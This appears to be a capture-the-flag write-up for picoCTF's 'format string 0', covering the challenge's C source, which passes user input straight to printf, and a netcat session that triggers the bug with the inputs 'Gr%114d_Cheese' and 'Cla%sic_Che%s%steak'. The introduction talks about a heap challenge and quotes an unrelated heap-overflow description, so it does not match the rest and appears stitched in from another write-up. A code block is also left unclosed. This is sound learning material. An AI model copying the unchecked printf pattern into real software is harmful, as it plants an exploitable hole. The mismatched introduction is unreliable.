# format string 0

Level: Easy

## Initial Thoughts
This challenge is called heap, so right away I am thinking we are going to be working with the heap somehow.

This thought was solidified further after reading the description:
```text
Are overflows just a stack concern
```

So we are likely not working with the stack, but rather the heap

As always, I launched the instance and saw three new things:
1. The program source file: `format-string-0.c`
2. The program binary file: `format-string-0`
3. A server to connect to via netcat: `nc mimas.picoctf.net <port>`

Right away, I checked out the source file and the binary.

First, the source file:
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```

What's going on here? Well, it seems we are provided with three choices for three individuals to be served. I wonder what will happen if we try out the options...

Let's try it!

## Solving the Challenge
After reading the code, we see the only options that fit the requirements are as follows:
- Patrick: `Gr%114d_Cheese` (passes since the printed characters exceed 64 bytes)
- Bob: `Cla%sic_Che%s%steak` (triggers the vulnerability since it is the only option with `%s`)

Ok... this seems too straightforward... but let's try it:

```sh
$ nc mimas.picoctf.net 49618
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)

Neat. this was our first example of a format string attack. Personally, I don't love this as a first introduction, but hopefully we will learn more later on!
